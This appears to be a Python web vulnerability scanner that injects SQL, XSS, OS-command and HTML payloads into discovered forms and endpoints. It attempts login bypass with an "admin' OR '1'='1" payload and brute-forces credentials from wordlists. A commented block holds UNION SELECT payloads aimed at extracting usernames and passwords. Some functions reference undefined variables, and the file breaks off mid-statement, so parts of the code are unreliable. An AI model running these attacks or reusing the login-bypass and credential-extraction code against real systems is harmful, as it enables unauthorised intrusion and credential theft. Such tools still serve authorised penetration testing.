import sys
import requests
from bs4 import BeautifulSoup
import platform
import os
import re
from itertools import product
from scripts.login_bruteforce import brute_force_login
from urllib.parse import urljoin



def create_session():
    """
    Creates and returns a new requests session with default headers.
    Used to maintain cookies and session persistence during scanning.
    """

    session = requests.Session()
    print("Creating session")
    return session


def parse_input_fields(url, session):
    """
    Extracts form-based and standalone input fields from the specified URL.

    Args:
        url (str): Target URL to scan for input fields.
        session (requests.Session): Authenticated session object.

    Returns:
        dict: Contains two keys - 'forms' (list of form structures) and 'input_tags' (standalone input elements).
    """

    headers = {"User-Agent": "Mozilla/5.0"}
    forms = []
    input_tags = []

    try:
        response = session.get(url, headers=headers, timeout=10)
        #print("response: ", response.text)
        soup = BeautifulSoup(response.text, "html.parser")

        # --- Parse <form> tags (with <input> or <textarea>) ---
        for form in soup.find_all("form"):
            form_details = {
                "action": form.get("action") or url,
                "method": form.get("method", "get").lower(),
                "inputs": []
            }

            for tag in form.find_all(["input", "textarea"]):
                input_name = tag.get("name") or tag.get("id")
                input_type = tag.get("type", "text") if tag.name == "input" else "textarea"
                
                if input_type in ["submit", "button", "reset", "image", "file"]:
                    continue  # Skip non-input fields
                
                if input_name:
                    form_details["inputs"].append({
                        "name": input_name,
                        "type": input_type
                    })

            if form_details["inputs"]:
                forms.append(form_details)

        # --- Parse standalone <input> and <textarea> fields outside <form> ---
        if not forms:
            print("No <form> tags with valid inputs found. Checking standalone fields...")

        for tag in soup.find_all(["input", "textarea"]):
            parent_form = tag.find_parent("form")
            if not parent_form:  # Only consider tags outside a form
                input_name = tag.get("name") or tag.get("id")
                input_type = tag.get("type", "text") if tag.name == "input" else "textarea"
                if input_name:
                    print(f"[DEBUG] Standalone input detected: {input_name} (type={input_type})")
                    input_tags.append({
                        "name": input_name,
                        "type": input_type,
                        "action": url,
                        "method": "get"
                    })

        return {
            "forms": forms,
            "input_tags": input_tags
        }

    except Exception as e:
        print(f"[-] Error while parsing inputs: {e}")
        return {
            "forms": [],
            "input_tags": []
        }


def load_payloads(vuln_type):
    """
    Loads payloads for the given vulnerability type from default and custom payload directories.

    Args:
        vuln_type (str): Type of vulnerability (e.g., xss, sql_injection, command_injection).

    Returns:
        list: A deduplicated list of payload strings.
    """

    payloads = []

    base_dir = os.path.dirname(__file__)
    default_file = os.path.join(base_dir, "payload_texts", f"{vuln_type}.txt")

    custom_file = os.path.join(
        base_dir, "custom_payloads", f"{vuln_type}_custom.txt")

    if os.path.exists(default_file):
        with open(default_file, "r", encoding="utf-8") as f:
            payloads.extend([line.strip() for line in f if line.strip()])

    if os.path.exists(custom_file):
        print(f"[DEBUG] Using custom payloads from: {custom_file}")
        with open(custom_file, "r", encoding="utf-8") as f:
            payloads.extend([line.strip() for line in f if line.strip()])

    return list(set(payloads))  # Deduplicate


def detect_login_page(target_url, session):
    """
    Identifies the login page by:
    1. Checking for HTTP redirects.
    2. Scanning for login-related input fields on the target page.
    3. Attempting known login paths if needed.

    Args:
        target_url (str): The target page URL to check.
        session (requests.Session): Session used for sending requests.

    Returns:
        str: The best-matched login page URL or base URL fallback.
    """

    print(f"[*] Detecting login page from: {target_url}")
    headers = {"User-Agent": "Mozilla/5.0"}
    base_url = target_url  # Use the full URL as base

    username_keywords = ["user", "username", "email", "uid"]
    password_keywords = ["pass", "password", "pswd", "secret", "passw"]

    # === Step 1: Follow redirection logic ===
    try:
        response = session.get(target_url, headers=headers,
                            timeout=10, allow_redirects=False, verify=False)
        if response.status_code in [301, 302, 303]:
            location = response.headers.get("Location", "")
            if location:
                if not location.startswith("http"):
                    base = "/".join(target_url.split("/")[:3])
                    location = base +"/" + location
                print(f"[→] Redirected to login page at: {location}")
                return location
    except Exception as e:
        print(f"[!] Redirect detection failed: {e}")


    # === Step 3: Fallback to common login paths ===
    print("[*] Scanning for actual login page...")
    possible_paths = [
        "/", "/login", "/login.php", "/signin", "/auth", "/index", "/home", "/admin", "/account/login"
    ]

    headers = {"User-Agent": "Mozilla/5.0"}
    for path in possible_paths:
        full_url = base_url.rstrip("/") + path
        print(f"[DEBUG] Checking: {full_url}")
        try:
            r = session.get(full_url, headers=headers,
                            timeout=10, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")

            for form in soup.find_all("form"):
                inputs = [i.get("name", "").lower()
                        for i in form.find_all("input")]
                if any("user" in i or "email" in i or "login" in i for i in inputs) and any("pass" in i or "pswd" in i or "password" in i for i in inputs):
                    print(f"[+] Login page identified at: {full_url}")
                    return full_url
        except Exception as e:
            print(f"[!] Error checking {full_url}: {e}")

    print("[-] Could not detect login page automatically.")

    # === Step 2: Check if target URL itself contains login form ===
    try:
        response = session.get(target_url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")
        for form in soup.find_all("form"):
            inputs = [i.get("name", "").lower() for i in form.find_all("input")]

            found_user = any(any(keyword in i for keyword in username_keywords) for i in inputs)
            found_pass = any(any(keyword in i for keyword in password_keywords) for i in inputs)

            if found_user:
                print(f"[DEBUG] Found username-related field in: {inputs}")
            if found_pass:
                print(f"[DEBUG] Found password-related field in: {inputs}")

            if found_user and found_pass:
                print(f"[🔐] Login form found on current page: {target_url}")
                return target_url
    except Exception as e:
        print(f"[!] HTML form detection failed: {e}")
    return base_url  # fallback to base



'''sql_payloads = [
                f"' UNION SELECT {', '.join(['sqlite_version()'] + ['NULL'] * (num_cols - 1))} --",
                "' ORDER BY 2 --",
                f"' UNION SELECT {', '.join(['username', 'password'] + ['NULL'] * (num_cols - 2))} FROM users --"
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' AND name LIKE '%user%' --",
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' --",
                f"' UNION SELECT {', '.join(['sql'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE name='users' --",
                "' OR X'61646d696e'='admin' --",
                "' OR 'a' || 'a' = 'aa' --"
            ]'''


def test_sql_injection(base_url, session, is_api=False, api_endpoints=[]):
    """
    Tests for SQL Injection vulnerabilities via form fields, standalone input fields, and optional API endpoints.

    Args:
        base_url (str): Target URL or base route of the web app.
        session (requests.Session): Session for request handling.
        is_api (bool): Whether to test API endpoints.
        api_endpoints (list): List of API endpoint URLs to test.

    Returns:
        list: List of SQLi test results.
    """

    results = []
    sql_error_signatures = [
        "sql syntax",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "you have an error in your sql syntax",
        "warning: mysql",
        "warning: pg_",
        "fatal error",
        "odbc sql",
        "syntax error",
        "near '",
        "unterminated string constant",
        "sqlstate",
        "microsoft jet database",
        "unknown column",
        "Invalid",
        "not found"
    ]

    results.append(" ")
    results.append(
        "=========================== SQL Injection ===========================")

    # Load SQL Injection payloads
    raw_payloads = load_payloads("sql_injection")
    if not raw_payloads:
        results.append(
            "[-] No SQLi payloads found. Check payload_texts/sql_injection.txt")
        return results

    # API Endpoint testing
    if is_api and api_endpoints:
        results.append("\n API Endpoints:")
        for endpoint in api_endpoints:
            results.append(f"\n Endpoint → {endpoint}")
            try:
                baseline_data = {
                    inp["name"]: "normaltest" if inp["name"] == name and inp["type"] == "text" else "test"
                    for inp in form["inputs"]
                }
                if form["method"] == "post":
                    baseline = session.post(form_action, data=baseline_data)
                else:
                    baseline = session.get(form_action, params=baseline_data)
                base_len = len(baseline.text)
            except:
                base_len = 0
            for payload in raw_payloads:
                try:
                    r = session.get(endpoint, params={"q": payload})
                    response_length = r
                    response_length = len(r.text)

                    # error
                    if any(err in r.text.lower() for err in sql_error_signatures) or r.status_code == 500:
                        results.append(
                            f"[~] SQL error-based injection detected with payload: {payload}")
                    # echo back / reflected payload
                    elif payload.lower() in r.text.lower():
                        results.append(
                            f"[-] Input reflected but no SQL error: {payload}")
                    # no change
                    elif response_length == base_len:
                        results.append(
                            f"[-] No output change (same response length) for payload: {payload}")
                    else:
                        results.append(
                            f"[+] Potential SQL Injection vulnerability detected with payload: {payload}")

                except Exception as e:
                    results.append(f"[!] Error testing {endpoint}: {e}")
        return results
    # Form & Input tag testing
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"]
    # === 1. Forms ===
    results.append("\n Forms:")
    for form_index, form in enumerate(forms):
        action = form.get("action")
        form_action = urljoin(base_url, action) if action else base_url
        method = form.get("method", "post").lower()

        # Determine column count
        num_cols = 0
        for i in range(1, 20):
            test_payload = {
                inp["name"]: f"' ORDER BY {i} --" if inp["type"] == "text" else "test"
                for inp in form["inputs"] if inp["name"]
            }
            try:
                if method== "post":
                    r = session.post(form_action, data=test_payload)
                else:
                    r = session.get(form_action, params=test_payload)
                if "error" in r.text.lower():
                    num_cols = i - 1
                    break
            except:
                break
        results.append(f"[DEBUG] Columns Detected: {num_cols}")
        if num_cols == 0:
            return results

        sql_payloads = [inject_column_placeholders(
            p, num_cols) for p in raw_payloads] if num_cols > 0 else raw_payloads

        for input_field in form["inputs"]:
            name = input_field["name"]
            results.append(f"\nForm {form_index + 1} → Input Field '{name}':")
            for payload in sql_payloads:
                data = {
                    inp["name"]: payload if inp["name"] == name and inp["type"] == "text" else "test"
                    for inp in form["inputs"]
                }
                try:
                    baseline_data = {
                        inp["name"]: "normaltest" if inp["name"] == name and inp["type"] == "text" else "test"
                        for inp in form["inputs"]
                    }
                    if form["method"] == "post":
                        baseline = session.post(
                            form_action, data=baseline_data)
                    else:
                        baseline = session.get(
                            form_action, params=baseline_data)
                    base_len = len(baseline.text)
                except:
                    base_len = 0

                try:
                    if form["method"] == "post":
                        r = session.post(form_action, data=data)
                        response_length = len(r.text)
                    total = base_len  + len(payload)
                    length_diff = abs(response_length - (base_len + len(payload)))
                    #print("Payload = ", payload, "Response code", r.status_code)
                    #print(f"Base length :   {base_len}, Response length :   {response_length}, payload : {len(payload)} + base = {total} ")
                    # echo back / reflected payload
                    if payload.lower() in r.text.lower():
                        results.append(
                            f"[-] Input reflected but no SQL error: {payload}")
                    elif any(err in r.text.lower() for err in sql_error_signatures) or r.status_code == 500:
                        results.append(
                            f"[~] Possible SQL error-based injection detected with payload: {payload}")
                    # no change
                    elif length_diff < 10:
                        results.append(
                            f"[-] No output change (same response length) for payload: {payload}")
                    else:
                        results.append(
                            f"[+] Potential SQL Injection vulnerability detected with payload: {payload}")
                except Exception as e:
                    results.append(f"[!] Error testing {payload}: {e}")

    # === 2. Standalone Input Tags ===
    if input_tags:
        results.append("\n Standalone Input Fields:")
    for input_tag in input_tags:
        name = input_tag["name"]
        results.append(f"\n Standalone Input → Field '{name}':")
        try:
            baseline_data = {
                inp["name"]: "normaltest" if inp["name"] == name and inp["type"] == "text" else "test"
                for inp in form["inputs"]
            }
            if form["method"] == "post":
                baseline = session.post(form_action, data=baseline_data)
            else:
                baseline = session.get(form_action, params=baseline_data)
            base_len = len(baseline.text)
        except:
            base_len = 0
        for payload in raw_payloads:
            try:
                r = session.get(base_url, params={name: payload})
                response_length = len(r.text)
                if payload.lower() in r.text.lower():
                    results.append(
                        f"[-] Input reflected but no SQL error: {payload}")
                elif any(err in r.text.lower() for err in sql_error_signatures) or r.status_code == 500:
                    results.append(
                        f"[~] SQL error-based injection detected with payload: {payload}")
                    # no change
                elif response_length == base_len:
                    results.append(
                        f"[-] No output change (same response length) for payload: {payload}")
                else:
                    results.append(
                        f"[+] Potential SQL Injection vulnerability detected with payload: {payload}")
            except Exception as e:
                results.append(f"[!] Error testing {name} → {e}")

    return results


def test_xss(base_url, session, is_api=False, api_endpoints=[]):
    """
    Tests for Cross-Site Scripting (XSS) vulnerabilities across forms, standalone inputs, and optional API endpoints.

    Args:
        base_url (str): Target page or domain.
        session (requests.Session): Authenticated session object.
        is_api (bool): Whether to test API endpoints.
        api_endpoints (list): List of API endpoint URLs.

    Returns:
        list: List of XSS test results.
    """

    results = []
    results.append(" ")
    results.append(
        "=========================== Cross-Site Scripting (XSS) Test Results: ===========================")

    payloads = load_payloads("xss")
    if not payloads:
        results.append(
            "[-] No XSS payloads found. Check payload_texts/xss.txt")
        return results

    # === FORMS and STANDALONE INPUTS ===
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"]

    # --- Forms ---
    if forms:
        results.append("\n Forms-Based Inputs:")
        for form_index, form in enumerate(forms):
            action = form.get("action")
            form_action = urljoin(base_url, action) if action else base_url
            method = form.get("method", "post").lower()

            for input_field in form["inputs"]:
                input_name = input_field["name"]
                input_type = input_field["type"]

                results.append(
                    f"\nForm {form_index + 1} → Input: {input_name}")

                for payload in payloads:
                    data = {
                        field["name"]: (payload if field["name"] == input_name and field["type"] in [
                                        "text", "textarea"] else "test")
                        for field in form["inputs"] if field["name"]
                    }

                    try:
                        if method== "post":
                            r = session.post(form_action, data=data)
                        else:
                            r = session.get(form_action, params=data)

                        if payload in r.text:
                            results.append(
                                f"[+] XSS confirmed with payload: {payload}")
                        else:
                            results.append(
                                f"[-] Payload not executed: {payload}")
                    except Exception as e:
                        results.append(
                            f"[!] Error on input '{input_name}' with payload '{payload}': {e}")

    # --- Standalone Input Tags ---
    if input_tags:
        results.append("\n Standalone Input Tags:")
        for input_field in input_tags:
            field_name = input_field["name"]
            field_type = input_field["type"]

            results.append(f"\n Input Field: {field_name}")

            for payload in payloads:
                params = {field_name: payload if field_type in [
                    "text", "textarea"] else "test"}

                try:
                    r = session.get(base_url, params=params)
                    if payload in r.text:
                        results.append(
                            f"[+] XSS detected on standalone input using payload: {payload}")
                    else:
                        results.append(
                            f"[-] Payload not executed on input: {payload}")
                except Exception as e:
                    results.append(
                        f"[!] Error on input '{field_name}' with payload '{payload}': {e}")

    # === API Endpoints ===
    if is_api and api_endpoints:
        results.append("\n API Endpoint Testing:")
        for endpoint in api_endpoints:
            results.append(f"\n API → {endpoint}")
            for payload in payloads:
                try:
                    r = session.get(endpoint, params={"q": payload})
                    if payload in r.text:
                        results.append(
                            f"[+] XSS likely using payload: {payload}")
                    else:
                        results.append(f"[-] Payload not reflected: {payload}")
                except Exception as e:
                    results.append(
                        f"[!] Error testing {endpoint} with payload {payload}: {e}")

    return results


def test_command_injection(base_url, session, is_api=False, api_endpoints=[]):
    """
    Tests for OS Command Injection using payloads with success indicators on form inputs and endpoints.

    Args:
        base_url (str): Web page base URL to test.
        session (requests.Session): Active HTTP session.
        is_api (bool): Whether to test API endpoints.
        api_endpoints (list): Optional list of endpoint URLs.

    Returns:
        list: Detected command injection results.
    """
    results = []
    results.append(" ")
    results.append(
        "=========================== Command Injection ===========================")

    # Select payload file based on OS
    payload_file = "command_injection_windows" if platform.system(
    ).lower() == "windows" else "command_injection_linux"
    raw_payloads = load_payloads(payload_file)

    if not raw_payloads:
        results.append(
            f"[-] No Command Injection payloads found. Check payload_texts/{payload_file}.txt")
        return results

    #print(f"[DEBUG] Loaded {len(raw_payloads)} Command Injection payloads.")

    # Parse command/injection pairs
    payloads = []
    for line in raw_payloads:
        parts = line.split(",", 1)
        if len(parts) == 2:
            command, success_indicator = parts[0].strip(), parts[1].strip()
            payloads.append((command, success_indicator))
        else:
            print(f"[WARNING] Invalid payload format: {line}")

    # === 1. Form-based Testing ===
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"]

    results.append("\nForms:")
    for form_index, form in enumerate(forms):
        action = form.get("action")
        form_action = urljoin(base_url, action) if action else base_url
        method = form.get("method", "post").lower()

        for input_field in form["inputs"]:
            input_name = input_field["name"]
            input_type = input_field["type"]
            results.append(
                f"\n Form {form_index + 1} → Input Field '{input_name}':")
            for command, indicator in payloads:
                data = {
                    inp["name"]: command if inp["name"] == input_name and inp["type"] == "text" else "test"
                    for inp in form["inputs"]
                }
                try:
                    if form["method"] == "post":
                        r = session.post(form_action, data=data)
                    else:
                        r = session.get(form_action, params=data)
                    if indicator in r.text:
                        results.append(f"[+] Command executed → {command}")
                    else:
                        results.append(f"[-] No result for → {command}")
                except Exception as e:
                    results.append(f"[!] Error on payload {command}: {e}")

    # === 2. Standalone Input Fields ===
    if input_tags:
        results.append("\n Standalone Input Fields:")
    for tag in input_tags:
        if not isinstance(tag, dict):
            results.append(f" Skipping malformed input tag: {tag}")
            continue
        input_name = tag.get("name")
        input_type = tag.get("type", "text")

        if not input_name:
            results.append(" Skipping input tag with no name.")
            continue

        results.append(f"\n Standalone Input → Field '{input_name}':")
        for command, indicator in payloads:
            params = {input_name: command}
            try:
                r = session.get(base_url, params=params)
                if indicator in r.text:
                    results.append(f"[+] Command executed → {command}")
                else:
                    results.append(f"[-] No result for → {command}")
            except Exception as e:
                results.append(f"[!] Error on payload {command}: {e}")


    # === 3. API Endpoint Testing ===
    if is_api and api_endpoints:
        results.append("\n API Endpoints:")
        for endpoint in api_endpoints:
            results.append(f"\n Endpoint → {endpoint}")
            for command, indicator in payloads:
                try:
                    r = session.get(endpoint, params={"cmd": command})
                    if indicator in r.text:
                        results.append(f"[+] Command executed → {command}")
                    else:
                        results.append(f"[-] No result for → {command}")
                except Exception as e:
                    results.append(f"[!] Error on endpoint {endpoint}: {e}")

    return results


def test_html_injection(base_url, session, is_api=False, api_endpoints=[]):
    """
    Detects HTML Injection vulnerabilities via reflected content in forms, inputs, and APIs.

    Args:
        base_url (str): Target URL for scanning.
        session (requests.Session): HTTP session object.
        is_api (bool): Whether to test API endpoints.
        api_endpoints (list): Optional list of endpoint URLs.

    Returns:
        list: Results of HTML Injection attempts.
    """

    results = []
    results.append(" ")
    results.append(
        "=========================== HTML Injection ===========================")

    # Load payloads
    payloads = load_payloads("html_injection")
    if not payloads:
        results.append("[-] No HTML Injection payloads found.")
        return results

    print(f"[DEBUG] Loaded {len(payloads)} HTML Injection payloads.")

    # === 1. Form-based Testing ===
    parsed_inputs = parse_input_fields(base_url, session)
    print(f"#################################################################")
    print(f"[DEBUG] Target URL: {base_url}")
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"]
    results.append("\n Forms:")
    for form_index, form in enumerate(forms):
        if not isinstance(form, dict):
            results.append(
                f" Skipping malformed form at index {form_index}: {form}")
            continue
        action = form.get("action")
        form_action = urljoin(base_url, action) if action else base_url
        method = form.get("method", "post").lower()


        print(f"[DEBUG] Testing form action: {form_action}")

        for input_field in form["inputs"]:
            input_name = input_field["name"]
            input_type = input_field["type"]
            results.append(
                f"\n Form {form_index + 1} → Input Field '{input_name}':")
            for payload in payloads:
                data = {
                    inp["name"]: payload if inp["name"] == input_name and inp["type"] in [
                        "text", "textarea"] else "test"
                    for inp in form["inputs"]
                }
                try:
                    if method == "post":
                        r = session.post(form_action, data=data)
                    else:
                        r = session.get(form_action, params=data)
                    if payload in r.text:
                        results.append(f"[+] Payload succeeded → {payload}")
                    else:
                        results.append(
                            f"[-] Payload not reflected → {payload}")
                except Exception as e:
                    results.append(f"[!] Error testing payload {payload}: {e}")

    # === 2. Standalone <input> Tags ===
    if input_tags:
        results.append("\n Standalone Input Fields:")
    for tag in input_tags:
        input_name = tag["name"]
        input_type = tag["type"]
        results.append(f"\n Standalone Input → Field '{input_name}':")
        for payload in payloads:
            params = {input_name: payload}
            try:
                r = session.get(base_url, params=params)
                if payload in r.text:
                    results.append(f"[+] Payload succeeded → {payload}")
                else:
                    results.append(f"[-] Payload not reflected → {payload}")
            except Exception as e:
                results.append(
                    f"[!] Error testing {payload} on input '{input_name}': {e}")

    # === 3. API Endpoint Testing ===
    if is_api and api_endpoints:
        results.append("\n API Endpoints:")
        for endpoint in api_endpoints:
            results.append(f"\n Endpoint → {endpoint}")
            for payload in payloads:
                try:
                    r = session.get(endpoint, params={"query": payload})
                    if payload in r.text:
                        results.append(f"[+] Payload succeeded → {payload}")
                    else:
                        results.append(
                            f"[-] Payload not reflected → {payload}")
                except Exception as e:
                    results.append(
                        f"[!] Error testing endpoint {endpoint} with {payload}: {e}")

    return results


def xss_only(target_url):
    """
    Executes an XSS-only scan on the given target URL.
    Handles login (SQLi, brute force) if required before scanning.

    Args:
        target_url (str): Target page for XSS testing.

    Returns:
        list: Result log of XSS test.
    """

    results = []
    session = create_session()
    test_login_url = detect_login_page(target_url, session)
    test_login_url = detect_login_page(target_url, session)
    login_url = detect_login_page(target_url, session)
    print(f"Location returned {login_url}")

    # login_url = "/".join(target_url.split("/")[:3])
    login_required = is_login_required(target_url, session)

    if login_required:
        results.append(
            f"[+] Attempting SQL Injection on login page: {login_url}...")
        sql_results = login_sql_injection(login_url, session)
        results.extend(sql_results)

        if any("[+]" in result for result in sql_results):
            results.append(
                f"[+] Login successful! Proceeding to the target page...")
            results.extend(test_xss(target_url, session))
        else:
            results.append(
                "[-] SQL Injection failed. Attempting brute-force...")
            creds = brute_force_login(login_url, session)
            if creds:
                results.append(
                    f"[+] Brute-force success → Username: {creds[0]} | Password: {creds[1]}")
                results.append(
                    f"[+] Login successful! Proceeding to the target page...")
                results.extend(test_xss(target_url, session))
            else:
                results.append(
                    "[-] Both SQLi and Brute-force login failed. Skipping XSS test.")
    else:
        # no login required
        results.extend(test_xss(target_url, session))
    return results


def command_only(target_url):
    """
    Performs command injection testing on the target URL.
    Handles login if required using SQLi or brute force.

    Args:
        target_url (str): Endpoint or page to be tested.

    Returns:
        list: Command injection vulnerability report.
    """

    results = []
    session = create_session()
    login_url = detect_login_page(target_url, session)
    print(f"Location returned {login_url}")
    # login_url = "/".join(target_url.split("/")[:3])
    login_required = is_login_required(target_url, session)

    if login_required:
        results.append(
            f"[+] Attempting SQL Injection on login page: {login_url}...")
        sql_results = login_sql_injection(login_url, session)
        results.extend(sql_results)

        if any("[+]" in result for result in sql_results):
            results.append(
                f"[+] Login successful! Proceeding to the target page...")
            results.extend(test_command_injection(target_url, session))
        else:
            results.append(
                "[-] SQL Injection failed. Attempting brute-force...")
            creds = brute_force_login(login_url, session)
            if creds:
                results.append(
                    f"[+] Brute-force success → Username: {creds[0]} | Password: {creds[1]}")
                results.append(
                    f"[+] Login successful! Proceeding to the target page...")
                results.extend(test_command_injection(target_url, session))
            else:
                results.append(
                    "[-] Both SQLi and Brute-force login failed. Skipping Command Injection test.")
    else:
        results.extend(test_command_injection(target_url, session))
    return results


def html_only(target_url):
    """
    Performs HTML Injection testing on the specified URL.
    Handles login scenarios if present.

    Args:
        target_url (str): Target URL for testing.

    Returns:
        list: HTML Injection findings.
    """

    results = []
    session = create_session()
    login_url = detect_login_page(target_url, session)
    print(f"Location returned {login_url}")
    # login_url = "/".join(target_url.split("/")[:3])
    login_required = is_login_required(target_url, session)

    if login_required:
        results.append(
            f"[+] Attempting SQL Injection on login page: {login_url}...")
        sql_results = login_sql_injection(login_url, session)
        results.extend(sql_results)

        if any("[+]" in result for result in sql_results):
            results.append(
                f"[+] Login successful! Proceeding to the target page...")
            results.extend(test_html_injection(target_url, session))
        else:
            results.append(
                "[-] SQL Injection failed. Attempting brute-force...")
            creds = brute_force_login(login_url, session)
            if creds:
                results.append(
                    f"[+] Brute-force success → Username: {creds[0]} | Password: {creds[1]}")
                results.append(
                    f"[+] Login successful! Proceeding to the target page...")
                results.extend(test_html_injection(target_url, session))
            else:
                results.append(
                    "[-] Both SQLi and Brute-force login failed. Skipping HTML Injection test.")
    else:
        results.extend(test_html_injection(target_url, session))
    return results


def sql_only(target_url):
    """
    Executes SQL Injection tests only.
    Handles login bypass before injection testing.

    Args:
        target_url (str): Page to scan for SQL injection vulnerabilities.

    Returns:
        list: SQL injection results.
    """

    results = []
    session = create_session()
    login_url = detect_login_page(target_url, session)
    print(f"Location returned {login_url}")
    # login_url = "/".join(target_url.split("/")[:3])
    login_required = is_login_required(target_url, session)

    if login_required:
        results.append(
            f"[+] Attempting SQL Injection on login page: {login_url}...")
        sql_results = login_sql_injection(login_url, session)
        results.extend(sql_results)

        if any("[+]" in result for result in sql_results):
            results.append(
                f"[+] Login successful! Proceeding to the target page...")
            results.extend(test_sql_injection(target_url, session))
        else:
            results.append(
                "[-] SQL Injection failed. Attempting brute-force...")
            creds = brute_force_login(login_url, session)
            if creds:
                results.append(
                    f"[+] Brute-force success → Username: {creds[0]} | Password: {creds[1]}")
                results.append(
                    f"[+] Login successful! Proceeding to the target page...")
                results.extend(test_sql_injection(target_url, session))
            else:
                results.append(
                    "[-] Both SQLi and Brute-force login failed. Skipping SQL Injection test.")
    else:
        results.extend(test_sql_injection(target_url, session))
    return results


def login_sql_injection(base_url, session):
    """
    Attempts to bypass login using classic SQL Injection on detected login forms.

    Args:
        base_url (str): Login page URL.
        session (requests.Session): Session object for request reuse.

    Returns:
        list: Login attempt results.
    """

    results = []
    results.append(f" ")
    results.append(f"\n Login Using SQL Injection:")

    if session == None:
        session = create_session()
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"]
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            # results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Construct payload for SQL Injection
        payload = {
            input_field["name"]: "admin' OR '1'='1" if input_field["type"] == "text" else "password"
            for input_field in form["inputs"] if input_field["name"]
        }

        try:
            # Send the payload using the appropriate HTTP method
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)

            if "welcome" in response.text or "dashboard" in response.text.lower() or "hello" in response.text.lower():
                results.append("[+] SQL Injection successful!")
            else:
                results.append("[-] SQL Injection failed.")
        except Exception as e:
            results.append(f"[-] Error while testing SQL Injection: {e}")
    return results


def is_login_required(url, session):
    """
    Determines whether the given URL requires login based on actual form analysis.

    Args:
        url (str): Page URL to inspect.
        session (requests.Session): Active HTTP session.

    Returns:
        bool: True if login-related form is found, False otherwise.
    """
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        r = session.get(url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")

        for form in soup.find_all("form"):
            inputs = [i.get("name", "").lower() for i in form.find_all("input")]
            if any(k in i for i in inputs for k in ["user", "uname", "email", "login","uid"]) and \
               any(k in i for i in inputs for k in ["pass", "password","passw"]):
                print(f"[🔐] Login form detected at {url}")
                return True

        return False  # No valid login form found

    except Exception as e:
        print(f"[!] Error checking for login at {url}: {e}")
        return False


# brute force only function
def test_brute_force(base_url):
    """
    Dynamically attempts brute-force login by parsing login form structure and trying credentials.

    Args:
        base_url (str): Target URL to attempt brute force login.

    Returns:
        list: Success or failure messages for each attempt.
    """

    print(f"URL in brute force function : {base_url}")
    results = []
    session = create_session()
    headers = {"User-Agent": "Mozilla/5.0"}

    login = is_login_required(base_url,session)
    #print(login)
    if login:
        print(f"[*] Starting brute-force login on: {base_url}")

    try:
        resp = session.get(base_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
    except Exception as e:
        print(f"[!] Failed to load login page: {e}")
        return None

    form = soup.find("form")
    if not form:
        print("[-] No <form> found on the page.")
        return None

    action = form.get("action")
    print(" action",action )
    form_action = urljoin(base_url, action) if action else base_url
    print("form action, ", form_action)
    method = form.get("method", "post").lower()

    inputs = form.find_all("input")
    input_names = [i.get("name") for i in inputs if i.get("name")]

    # Load credentials
    base_dir = os.path.dirname(os.path.abspath(__file__))
    user_file = os.path.join(base_dir, "usernames.txt")
    pass_file = os.path.join(base_dir, "passwords.txt")

    try:
        with open(user_file, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(pass_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Username or password file not found.")
        return None

    for username, password in product(usernames, passwords):
        data = {}
        for tag in inputs:
            name = tag.get("name")
            if not name:
                continue
            # Fill based on name heuristics
            if any(k in name.lower() for k in ["user", "email", "uid", "login"]):
                data[name] = username
            elif any(k in name.lower() for k in ["pass", "pwd"]):
                data[name] = password
            else:
                data[name] = tag.get("value", "test")  # Keep default or dummy

        print(f"Trying: {username} | {password}")
        try:
            if method == "post":
                response = session.post(form_action, data=data, timeout=10)
            else:
                response = session.get(form_action, params=data, timeout=10)
            # Debugging output
            if username == "admin" and password == "admin":
                print(f"[DEBUG] Status: {response.status_code} | URL: {response.url}")
                print(f"[DEBUG] Response Snippet:\n{response.text}\n")

            text = response.text.lower()

            if any(k in text for k in ["logout", "welcome", "dashboard", "you have logged in", "hello"]):
                print(f"[+] Brute-force success: {username}:{password}")
                results.append(f"[+] Brute-force success: {username}:{password}")
                return results

        except Exception as e:
            print(f"[!] Error during attempt {username}:{password} → {e}")

    print("[-] No valid credentials found.")
    return results

def complete_scan(target_url):
    """
    Performs a complete vulnerability assessment:
    - Login bypass (SQLi, Brute-force)
    - API endpoint discovery
    - All injection types (SQLi, XSS, Command, HTML)

    Args:
        target_url (str): Web page or application base URL.

    Returns:
        list: Full vulnerability scan report.
    """

    results = []
    results.append(f"=== Vulnerability Scanner ===")

    session = requests.Session()
    print(f"Target URL: {target_url}")
    base_url = detect_login_page(target_url, session)
    print(f"#########################################################################")
    print(f"Location returned {base_url}")
    print(f"Base URL: {base_url}")
    print(f"Target URL: {target_url}")
    # Extract base login URL (e.g., http://127.0.0.1:5000)
    # base_url = "/".join(target_url.split("/")[:3])
    # check if login is required using a flag
    if is_login_required(base_url, session):
        login = False
        print("Login detected — trying SQLi...")
        results.append("Login detected — trying SQLi...")

        sql_results = login_sql_injection(base_url, session)
        results.extend(sql_results)

        if any("[+]" in r for r in sql_results):
            print("[+] SQLi login successful.")
            results.append(
